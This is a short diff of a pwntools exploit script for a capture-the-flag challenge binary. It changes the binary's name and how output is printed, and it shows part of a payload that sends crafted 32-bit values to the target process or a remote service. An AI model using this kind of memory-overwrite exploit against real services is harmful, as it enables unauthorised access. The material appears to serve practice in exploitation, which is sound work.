@@ -8,12 +8,12 @@ import time
 #context.log_level = 'DEBUG'
 #context.terminal = ['/usr/bin/termite', '-e']
 
-e = ELF('./guessy')
+e = ELF('./actually_not_guessy')
 
 if len(sys.argv) == 3:
     p = remote(sys.argv[1], int(sys.argv[2]))
 else:
-    p = process('./guessy')
+    p = process('./actually_not_guessy')
     #gdb.attach(p, 'b *main, *vuln')
 
     p.recvuntil('!')
@@ -24,7 +24,5 @@ else:
         + p32(0xACCE5515)
         + p32(0xFEA51B1E)
         )
-    out = p.recvall()
-    if b'flag' in out or b'Not quite.' in out:
-        print(out)
+    print(p.recvall())
     p.close()
